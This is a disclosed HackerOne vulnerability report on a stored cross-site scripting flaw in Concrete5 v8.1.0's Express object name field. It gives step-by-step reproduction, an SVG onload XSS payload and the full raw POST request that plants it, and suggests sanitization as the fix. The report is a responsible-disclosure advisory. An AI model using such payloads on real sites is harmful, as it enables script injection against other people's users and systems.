# Stored XSS in Express Objects - Concrete5 v8.1.0

## Report Details
- **Report ID**: 221325
- **URL**: https://hackerone.com/reports/221325
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-04-16T04:30:59.715Z
- **Disclosed**: 2017-05-17T18:16:26.662Z

## Reporter
- **Username**: cdl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: concretecms

## Vulnerability Information
**Summary / Description:**
The Entry Name (`name`) parameter does not correctly sanitize user input. This allows HTML & Javascript to be stored and executed any time someone visits `index.php/dashboard/express/entries` 

## Steps to Reproduce
1. Open up Firefox
2. Login (/index.php/login)
3. Visit (/index.php/dashboard/express/entries) and Click `Add Object`
4. Put `"><svg/onload=confirm(document.domain)>` as the name
5. Put whatever you want in the other fields and click submit

**POST REQUEST**
```
POST /index.php/dashboard/system/express/entities/add HTTP/1.1
Host: ec2-54-152-47-36.compute-1.amazonaws.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://ec2-54-152-47-36.compute-1.amazonaws.com/index.php/dashboard/system/express/entities/add
Cookie: CONCRETE5=me1oe767h2pqntejn04r7res44; CONCRETE5_LOGIN=1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 187

ccm_token=1492316818%3A96b9be81cefadc7cd0652797767ad64f&name=%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E&handle=blah&plural_handle=blah&description=&owned_by=&owning_type=many
```
6. `<svg/onload=confirm(document.domain)>` will be executed in your browser!

Now anytime you visit /index.php/dashboard/system/express/entities , the payload will be stored and executed!

## Product, Version, and Configuration (If applicable)
Concrete5 v8.1.0

## Suggested Mitigation/Remediation Actions
Sanitize the `name` parameter :P

## Attachments
- concrete5_object.png
- concrete5_object_stored_xss.png
- concrete5_object_xss.png
